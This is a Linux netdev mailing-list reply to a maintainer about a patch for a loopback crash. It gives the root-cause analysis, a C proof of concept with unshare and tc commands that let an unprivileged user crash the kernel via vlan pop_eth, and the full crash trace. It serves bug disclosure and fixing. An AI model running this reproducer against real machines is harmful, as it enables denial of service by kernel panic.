Received: from mail-lj1-f182.google.com (mail-lj1-f182.google.com [209.85.208.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D1211256C6D
	for <netdev@vger.kernel.org>; Wed,  5 Aug 2026 00:08:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.182
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785888506; cv=pass; b=OnMEFKJRX+dRzC7u5MLMCobCY4zh5oL1p1t1FzzpdOHtBaDYD3GAWqoo/Z5pVSX5lgBHpwDyhBiBMxE58H5aRs1kMIJOjRrypGecMkCQ+MajwBad+NitAZxohbjd52kHYEeF2vTLYnOODDp/F8PerdgimZuvvFkLNGHOCc04+Is=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785888506; c=relaxed/simple;
	bh=Er1bDKxW7h8sF+/gtbFv6gQSSx+ZM2OF/cOwCU4o000=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=s/K1FXImD4yn5nBATS/fUFxTgKjLZWaF0VNXsA4gakBkFp3dDEPk8xB1WSachLFfZONpzRZvyAwdH7GBW8vP3syUwni1mLdjUPceOaxP2fsa0LX33NmcSZ/qMmoM9nSVwV1M5r2R4rbRDD67YPGBDsG1rSRUnkXQOGmqW6kMteI=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LQZAYEM+; arc=pass smtp.client-ip=209.85.208.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LQZAYEM+"
Received: by mail-lj1-f182.google.com with SMTP id 38308e7fff4ca-39c74c469e8so2978741fa.0
        for <netdev@vger.kernel.org>; Tue, 04 Aug 2026 17:08:23 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785888502; cv=none;
        d=google.com; s=arc-20260327;
        b=ogXuaqKpTLScEDxawz1mObjbcFlYM+Fpx+8yK9bNrgKIfdzOUrDPtNUtlAW25mCn6l
         Cu1rFMPOZsCP8pK0uJTHnMRdjgR0DGRJBrbTNW+Sx61erTLsJy+DnmuIM7mu80SxryRg
         3OzwrBZjqLrwHBUBvl0PROaqcQjYeLkMv6Q0AQPBol1IvrbHPlTukZ8/WsZZeQMnz34c
         K+Mpf7UhPWF2MtgPASRshokAqQljxZe1El81N7WOOac0ma967wcDsxe7DL/RzIhW9H6Q
         /LCykV1D2aueSboyLTZRBpDDXFfz04VI5KP9Ak1EcNsMhugWql+cPRxeN17DCpU7vYWt
         y6Gw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=LscH4PUbBlfb+0CIQ+tIfthEB8qU3uE8TBxAWmGp7vQ=;
        fh=qA5cBaJNy/qq9vysam18JKOMXLsaaN0Rmb+mXKucRmU=;
        b=UqI8NIfuAWEipnKgOjD/5OM3NCr0b60o/pluJgDdZCG8rXFVtMzZBsrnvD2r6grJJb
         lPMJUd9HlUT2RnMbo5x40iPX8RdpeLRQT6FyI7o+8R2H1ARgMXpS+NN9xj2QjYfYXtR/
         WAL9QFQbCQwS28jzl1bQ9Gvr0k1Ir/FgU1J1JuhZaPnDPEZ1AjK+pIfWtj3nta6RnTaz
         ACPH+LpQCo98Oi7xkojlWDOc0zmdsMazooXd+Mg/wuDR55uSfe2+vNRoF9CQgV6SVxuy
         zTsdsbd4VXBwnPNZK0JPmn1HCWN2p+vS/PCzKd+xNQYwuK1jzVEi8NaTNL9gOZJWxwmS
         3nkA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785888502; x=1786493302; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=LscH4PUbBlfb+0CIQ+tIfthEB8qU3uE8TBxAWmGp7vQ=;
        b=LQZAYEM+N0pRly9WJq7PN3LVXywg2attKdwGGkpAHUr4fctYG03QJEwIRFukJ/AO5X
         xhdMjxRXVVhDiZbAAaiVeJ/9TmjXFZhTUzpbwoetzUVuSiiZNtpw7daNH/cwv4a1bguW
         5KbOPXlK19QwexwAMVXsx/O2M+eO+UAdeU9qXtGaKVW4v7c74ZaMie1JK+vh22nm78a8
         Uo9I539Ui+GUe4zXFYxvWbvgg5s9o1GM5/KKeqY7sGALDSn4qZ30RSh9uQljLqvSYJY4
         uqXftks8q1sG39Qa5fqXLDwTgfthJ5bkNJ1MI7vlp7lBB73I/OyAR0D9+I8Bq7QVJAwl
         dkOA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785888502; x=1786493302;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=LscH4PUbBlfb+0CIQ+tIfthEB8qU3uE8TBxAWmGp7vQ=;
        b=XLcCZE0+v0zbrQMKZPwc/I5+F1pk7wkdUZkom/rlH+L6dmjNeMyJSN9NmaT65lxVis
         XDMQdnFvMnWB9FWVCd8owZhD0GKgEqRbep2HRNeNbaqMv8XP87qPpgU63TW6A4FnBKm0
         cZMrOjDTseRrfl+7KEM9dE4uCzkoZwW4wleZCy2VZkSQ2cpv4QJKwcIrup4Evu5xWyn3
         TCNfpwAoYnWkofSyNiLIy3tGtWxEHsempXuP+WBLRbgM3HL9nr5KcxqDDz4ioj43VvD9
         zoPyj5ev/OO8HdYFEtCltR4aF7E4SQkZbBMxvpg52F2EAL6GYVh+iMGiwhtAL8OEPrH0
         t8Ug==
X-Forwarded-Encrypted: i=1; AHgh+RqjDCB/o6IDybPRkMypwSZZBopi4HCm1pkoO3ZOin/ST1Hp6Ew0P01WEkQlMhTZv21oUFsQA8k=@vger.kernel.org
X-Gm-Message-State: AOJu0Yw5yDtMod8nNgW/CeTmCLuqlUsIhso35hqEbSm9bajRQ9/L5adV
	N16utKyVHDkReFxJdV7Plyn2nIHXweGgaIMkOZUHwCRzJd32HQ9j6Wv4kKWxV7Fl7Vn2r3OFwWB
	evPWiiKqBCI+x3FCFSVKmc+yd20Nz8Rt5ujYze5/LxFA=
X-Gm-Gg: AR+sD12HZ4jXAGqNunzPTQ8RnR5bfneUwxaZD5+hnx6hXBq06HfLPzvFuOGskH3Ptw/
	aPn5qsgxevRXCTMOjJ+gnfGAOUbr7LwH1OTzqKdUUI9uM9iUWECzltB6vKF2ccekIL6eMgOWwtU
	baEaBEt0MJjATZbMqkpD4+0Jv3dmonZl0jUgL1w1yS04aBAPLFJTnvQWzj66RtDsluWgZ/CJjkI
	/u1LImFneD09BWEtowbsNfyFCk5VhhAw8dEsvUZvB5NapuQr6t+MOilsOOy9QXgIRlnB9ROBlRk
	2NGK7n//0KO/rp8lH4g6GUCCKsl5Y4oekeMT2SJyNMC3DEffxcM4+zo=
X-Received: by 2002:a05:651c:43cf:20b0:396:9897:4cc5 with SMTP id
 38308e7fff4ca-39fbb1a812fmr2077871fa.5.1785888501381; Tue, 04 Aug 2026
 17:08:21 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <2d4e79d252a57bdad83435999dddf2c4b708dcfa.1785049236.git.bronzed_45_vested@icloud.com>
 <20260731175022.18fd8744@kernel.org>
In-Reply-To: <20260731175022.18fd8744@kernel.org>
From: Nebula Security <vega@nebusec.ai>
Date: Tue, 4 Aug 2026 17:08:10 -0700
X-Gm-Features: AUfX_myUSNNG2MpSnovoqxZh0TyD0fCac2gJ1ZQp0W7aLf8vzh8-CSWDcP3mojg
Message-ID: <CAHYtud34rLPuGq6oSLem3VW8V+YrBBxdi+CRVbiQQZOrsRCOQA@mail.gmail.com>
Subject: Re: [PATCH net v3] net: loopback: ensure Ethernet header is linear
 before eth_type_trans
To: Jakub Kicinski <kuba@kernel.org>
Cc: Ren Wei <enjou1224z@gmail.com>, netdev@vger.kernel.org, andrew+netdev@lunn.ch, 
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com, 
	bronzed_45_vested@icloud.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Fri, Jul 31, 2026 at 5:50=E2=80=AFPM Jakub Kicinski <kuba@kernel.org> wr=
ote:
>
> On Tue, 28 Jul 2026 23:04:14 +0800 Ren Wei wrote:
> > loopback_xmit() passes skbs to eth_type_trans(), which expects a
> > complete Ethernet header in linear data before consuming ETH_HLEN
> > bytes.
> >
> > If an earlier path stripped or shortened the Ethernet header, a
> > non-linear skb can reach loopback with skb->len >=3D ETH_HLEN but fewer
> > than ETH_HLEN bytes in the linear area. eth_type_trans() then triggers
> > a BUG in __skb_pull(), causing a short-packet handling crash.
> >
> > Check pskb_may_pull(skb, ETH_HLEN) before calling
> > eth_type_trans(). This also rejects packets whose total length is
> > shorter than ETH_HLEN. Account rejected packets as tx drops instead of
> > crashing.
> >
> > The analogous VRF path is already protected because its IPv4 and IPv6
> > callers pull the Ethernet and network headers before calling
> > vrf_local_xmit().
>
> How are we getting the short frame in the xmit path?
> Please repost with the repro like you do for other bugs...


Wyatt=E2=80=99s email service seems to be having some issues, so I=E2=80=99=
m
forwarding his email here.

Wyatt, please don=E2=80=99t use iCloud again :)

In principle, all of our patches should now include a cover letter.
This may have been
overlooked during Ren Wei=E2=80=99s review. We=E2=80=99ll do our best to pr=
event this
from happening again.

From Wyatt:

Hi Jakub,

Sorry for not including the cover letter in this version. Here is the
root cause analysis and the reproducer. Let me know if this is enough
or we need to send out a v4 with a complete cover letter.

The frame is not short in terms of its total skb length. The problem is
that its linear area becomes shorter than ETH_HLEN before
loopback_xmit() is invoked.

The reproducer sends a large non-linear AF_PACKET skb through loopback.
The loopback egress tc action is executed before the driver's
ndo_start_xmit callback. TCA_VLAN_ACT_POP_ETH calls skb_eth_pop() there
and consumes the only ETH_HLEN bytes in the skb's linear area.

The skb state is approximately:

  before POP_ETH:
    skb->len      =3D 8206
    skb->data_len =3D 8192
    skb_headlen() =3D 14

  after POP_ETH:
    skb->len      =3D 8192
    skb->data_len =3D 8192
    skb_headlen() =3D 0

The skb then continues to loopback_xmit(). eth_type_trans() calls
__skb_pull(skb, ETH_HLEN), but no bytes are linear at that point, which
triggers the BUG.

Here is the reproducer.

Build:

  gcc -O2 -Wall -o mini_poc.bin mini_poc.c

Run it as an unprivileged user on a system where unprivileged user
namespaces are enabled:

  unshare -Urn sh -euxc '
  ip link set lo up
  trap "tc qdisc del dev lo clsact 2>/dev/null || true" EXIT
  tc qdisc add dev lo clsact
  tc filter add dev lo egress pref 1 protocol all flower \
    action vlan pop_eth \
    action skbmod dmac 02:11:22:33:44:55 pipe
  ./mini_poc.bin
  '

mini_poc.c:

```c
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main(void)
{
struct sockaddr_ll sll;
unsigned char *frame;
size_t len =3D ETH_HLEN + 8192;
int fd;

frame =3D malloc(len);
if (!frame) {
perror("malloc");
return 1;
}

memset(frame, 'A', len);
frame[0] =3D 0xaa;
frame[1] =3D 0xbb;
frame[2] =3D 0xcc;
frame[3] =3D 0xdd;
frame[4] =3D 0xee;
frame[5] =3D 0xff;
frame[6] =3D 0x11;
frame[7] =3D 0x22;
frame[8] =3D 0x33;
frame[9] =3D 0x44;
frame[10] =3D 0x55;
frame[11] =3D 0x66;
frame[12] =3D 0x08;
frame[13] =3D 0x00;

fd =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
if (fd < 0) {
perror("socket");
return 1;
}

memset(&sll, 0, sizeof(sll));
sll.sll_family =3D AF_PACKET;
sll.sll_protocol =3D htons(ETH_P_IP);
sll.sll_ifindex =3D if_nametoindex("lo");
if (!sll.sll_ifindex) {
perror("if_nametoindex");
return 1;
}

if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
perror("bind");
return 1;
}

if (send(fd, frame, len, 0) < 0) {
perror("send");
return 1;
}

close(fd);
free(frame);
return 0;
}
```

Crash report:

```
[  448.378183][ T9520] kernel BUG at include/linux/skbuff.h:2847!
[  448.378897][ T9520] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  448.380917][ T9520] Hardware name: Red Hat KVM, BIOS
1.16.0-4.module+el8.9.0+1408+7b966129 04/01/2014
[  448.381941][ T9520] RIP: 0010:eth_type_trans
(include/linux/skbuff.h:2847 include/linux/skbuff.h:2854 i
nclude/linux/etherdevice.h:644 net/ethernet/eth.c:164)
[  448.382994][ T9520] Code: 99 34 f8 44 89 73 70 be 0e 00 00 00 48 c7
c7 80 7d 19 8d e8 04 20 11 f8 31 d2

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
   0:   99                      cltd
   1:   34 f8                   xor    $0xf8,%al
   3:   44 89 73 70             mov    %r14d,0x70(%rbx)
   7:   be 0e 00 00 00          mov    $0xe,%esi
   c:   48 c7 c7 80 7d 19 8d    mov    $0xffffffff8d197d80,%rdi
  13:   e8 04 20 11 f8          callq  0xfffffffff811201c
  18:   31 d2                   xor    %edx,%edx
[  448.385098][ T9520] RSP: 0018:ffa000000746f5e0 EFLAGS: 00010246
[  448.385788][ T9520] RAX: 0000000000000000 RBX: ff11000032dbd380
RCX: ffffffff8963e9c5
[  448.386667][ T9520] RDX: 0000000000000200 RSI: ff1100002915cc40
RDI: 0000000000000002
[  448.387544][ T9520] RBP: 0000000000000010 R08: 0000000000000130
R09: 0000000000000000
[  448.388440][ T9520] R10: ffe21c000d3248e9 R11: ff1100006992474b
R12: ff11000029c64000
[  448.389318][ T9520] R13: ff1100004dbb5a90 R14: 0000000000002000
R15: 0000000000000010
[  448.390193][ T9520] FS:  00007f0f775f4540(0000)
GS:ff110000d537c000(0000) knlGS:0000000000000000
[  448.391186][ T9520] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  448.391923][ T9520] CR2: 0000558d8cdb7012 CR3: 000000004e001000
CR4: 0000000000751ef0
[  448.392796][ T9520] PKRU: 55555554
[  448.393215][ T9520] Call Trace:
[  448.393593][ T9520]  <TASK>
[  448.393947][ T9520]  loopback_xmit (drivers/net/loopback.c:87)
[  448.394665][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.395334][ T9520]  dev_hard_start_xmit
(include/linux/netdevice.h:5400 include/linux/netdevice.h:5409
[  448.395948][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.396608][ T9520]  __dev_queue_xmit (net/core/dev.c:4878)
[  448.397221][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.397895][ T9520]  ? __lock_acquire
(kernel/locking/lockdep.c:3820 kernel/locking/lockdep.c:3876 kern
[  448.398487][ T9520]  ? __pfx___dev_queue_xmit
(include/linux/netdevice.h:4038)
[  448.399134][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.399915][ T9520]  ? find_held_lock (kernel/locking/lockdep.c:5350)
[  448.400666][ T9520]  ? __might_fault (mm/memory.c:7292 mm/memory.c:7286)
[  448.401413][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.402246][ T9520]  ? __might_fault (mm/memory.c:7292 mm/memory.c:7286)
[  448.402996][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.403836][ T9520]  ? write_comp_data (kernel/kcov.c:246)
[  448.404592][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.405438][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.406259][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.407059][ T9520]  ? _copy_from_iter
(include/linux/iov_iter.h:299 include/linux/iov_iter.h:330 lib/i
[  448.407837][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.408672][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.409512][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.410336][ T9520]  ? _copy_from_iter
(include/linux/iov_iter.h:299 include/linux/iov_iter.h:330 lib/i
[  448.411101][ T9520]  ? __pfx__copy_from_iter (include/linux/iov_iter.h:1=
57)
[  448.411893][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.412709][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.413548][ T9520]  ? __pfx__copy_from_iter (include/linux/iov_iter.h:1=
57)
[  448.414356][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.415187][ T9520]  ? write_comp_data (kernel/kcov.c:246)
[  448.415918][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.416744][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.417477][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.418161][ T9520]  ? packet_parse_headers.isra.71
(include/linux/skbuff.h:3194 net/packet/af_packet.c
[  448.418877][ T9520]  ? __pfx_packet_parse_headers.isra.71
(net/packet/af_packet.c:1538)
[  448.419616][ T9520]  packet_xmit (include/linux/netdevice.h:3446
net/packet/af_packet.c:276 net/packet/
[  448.420242][ T9520]  ? write_comp_data (kernel/kcov.c:246)
[  448.420983][ T9520]  packet_sendmsg (net/packet/af_packet.c:3082
net/packet/af_packet.c:3114)
[  448.421740][ T9520]  ? __pfx_avc_has_perm (security/selinux/avc.c:529)
[  448.422522][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.423371][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.424194][ T9520]  ? __pfx_packet_sendmsg (net/packet/af_packet.c:2058=
)
[  448.424998][ T9520]  ? __pfx_sock_has_perm
(security/selinux/include/objsec.h:232)
[  448.425813][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.426651][ T9520]  ? write_comp_data (kernel/kcov.c:246)
[  448.427394][ T9520]  ? __entry_text_end (??:?)
[  448.428225][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.429111][ T9520]  ? tomoyo_dump_page (security/tomoyo/domain.c:908)
[  448.429780][ T9520]  ? __pfx_tomoyo_socket_sendmsg_permission
(security/tomoyo/network.c:604)
[  448.430650][ T9520]  ? release_sock (include/linux/spinlock.h:348
net/core/sock.c:3857)
[  448.431267][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.431997][ T9520]  ? write_comp_data (kernel/kcov.c:246)
[  448.432632][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.433360][ T9520]  ? selinux_socket_sendmsg
(include/net/sock.h:2962 security/selinux/hooks.c:5284)
[  448.434076][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.434809][ T9520]  ? write_comp_data (kernel/kcov.c:246)
[  448.435447][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.436172][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.436904][ T9520]  ? __pfx_packet_sendmsg (net/packet/af_packet.c:2058=
)
[  448.437585][ T9520]  __sock_sendmsg (net/socket.c:775 net/socket.c:790)
[  448.438232][ T9520]  __sys_sendto (net/socket.c:2252)
[  448.438835][ T9520]  ? __pfx___sys_sendto (net/socket.c:2206)
[  448.439489][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.440230][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.440954][ T9520]  ? __sys_bind (include/linux/file.h:62)
[  448.441512][ T9520]  ? __pfx___sys_bind (net/socket.c:1920)
[  448.442113][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.442800][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.443488][ T9520]  ? __sanitizer_cov_trace_pc (kernel/kcov.c:217)
[  448.444181][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.444865][ T9520]  ? fput_close_sync (fs/file_table.c:618)
[  448.445474][ T9520]  ? __pfx_fput_close_sync (fs/file_table.c:479)
[  448.446125][ T9520]  ? dnotify_flush (fs/notify/dnotify/dnotify.c:161)
[  448.446705][ T9520]  __x64_sys_sendto (net/socket.c:2259
net/socket.c:2255 net/socket.c:2255)
[  448.447296][ T9520]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S=
:220)
[  448.447978][ T9520]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:447=
2)
[  448.448620][ T9520]  do_syscall_64 (arch/x86/entry/syscall_64.c:63
arch/x86/entry/syscall_64.c:94)
[  448.449200][ T9520]  ? exc_page_fault (arch/x86/mm/fault.c:1539)
[  448.449794][ T9520]  entry_SYSCALL_64_after_hwframe
(arch/x86/entry/entry_64.S:121)
[  448.450550][ T9520] RIP: 0033:0x7f0f7751beec
[  448.451091][ T9520] Code: 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00
41 89 ca 64 8b 04 25 18 00 00 00 85

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
   0:   89 02                   mov    %eax,(%rdx)
   2:   48 c7 c0 ff ff ff ff    mov    $0xffffffffffffffff,%rax
   9:   eb b8                   jmp    0xffffffffffffffc3
   b:   0f 1f 00                nopl   (%rax)
   e:   41 89 ca                mov    %ecx,%r10d
  11:   64 8b 04 25 18 00 00    mov    %fs:0x18,%eax
  18:   00
  19:   59                      pop    %rcx
  1a:   54                      push   %rsp
  1b:   24 10                   and    $0x10,%al
[  448.453275][ T9520] RSP: 002b:00007fff626bab68 EFLAGS: 00000246
ORIG_RAX: 000000000000002c
[  448.454260][ T9520] RAX: ffffffffffffffda RBX: 0000000000000000
RCX: 00007f0f7751beec
[  448.455181][ T9520] RDX: 000000000000200e RSI: 0000558dc49982a0
RDI: 0000000000000003
[  448.456100][ T9520] RBP: 0000558dc49982a0 R08: 0000000000000000
R09: 0000000000000000
[  448.457025][ T9520] R10: 0000000000000000 R11: 0000000000000246
R12: 0000000000000003
[  448.457939][ T9520] R13: 00007fff626bab70 R14: 0000000000000000
R15: 0000000000000000
[  448.458878][ T9520]  </TASK>
[  448.459251][ T9520] Modules linked in:
[  448.459848][ T9520] ---[ end trace 0000000000000000 ]---
[  448.460487][ T9520] RIP: 0010:eth_type_trans
(include/linux/skbuff.h:2847 include/linux/skbuff.h:2854 i
[  448.461162][ T9520] Code: 99 34 f8 44 89 73 70 be 0e 00 00 00 48 c7
c7 80 7d 19 8d e8 04 20 11 f8 31 d2
All code
=3D=3D=3D=3D=3D=3D=3D=3D
   0:   99                      cltd
   1:   34 f8                   xor    $0xf8,%al
   3:   44 89 73 70             mov    %r14d,0x70(%rbx)
   7:   be 0e 00 00 00          mov    $0xe,%esi
   c:   48 c7 c7 80 7d 19 8d    mov    $0xffffffff8d197d80,%rdi
  13:   e8 04 20 11 f8          callq  0xfffffffff811201c
  18:   31 d2                   xor    %edx,%edx
  1a:   48 89 de                mov    %rbx,%rsi
  1d:   48 c7 c7 c0 7d 19 8d    mov    $0xffffffff8d197dc0,%rdi
  24:   e8 43 b8 d5 ff          callq  0xffffffffffd5b86c
  29:   90                      nop
  2a:*  0f 0b                   ud2             <-- trapping instruction
  2c:   bd 00 01 00 00          mov    $0x100,%ebp
  31:   e9 1e ff ff ff          jmpq   0xffffffffffffff54
  36:   48 8b 7c 24 20          mov    0x20(%rsp),%rdi
  3b:   e8 ec 0f aa f8          callq  0xfffffffff8aa102c

Code starting with the faulting instruction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
   0:   0f 0b                   ud2
   2:   bd 00 01 00 00          mov    $0x100,%ebp
   7:   e9 1e ff ff ff          jmpq   0xffffffffffffff2a
   c:   48 8b 7c 24 20          mov    0x20(%rsp),%rdi
  11:   e8 ec 0f aa f8          callq  0xfffffffff8aa1002
[  448.463423][ T9520] RSP: 0018:ffa000000746f5e0 EFLAGS: 00010246
[  448.464153][ T9520] RAX: 0000000000000000 RBX: ff11000032dbd380
RCX: ffffffff8963e9c5
[  448.465098][ T9520] RDX: 0000000000000200 RSI: ff1100002915cc40
RDI: 0000000000000002
[  448.466030][ T9520] RBP: 0000000000000010 R08: 0000000000000130
R09: 0000000000000000
[  448.466947][ T9520] R10: ffe21c000d3248e9 R11: ff1100006992474b
R12: ff11000029c64000
[  448.467866][ T9520] R13: ff1100004dbb5a90 R14: 0000000000002000
R15: 0000000000000010
[  448.468795][ T9520] FS:  00007f0f775f4540(0000)
GS:ff110000d537c000(0000) knlGS:0000000000000000
[  448.469840][ T9520] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  448.470609][ T9520] CR2: 0000558d8cdb7012 CR3: 000000004e001000
CR4: 0000000000751ef0
[  448.471529][ T9520] PKRU: 55555554
[  448.471982][ T9520] Kernel panic - not syncing: Fatal exception in inter=
rupt
[  448.473183][ T9520] Kernel Offset: disabled
```
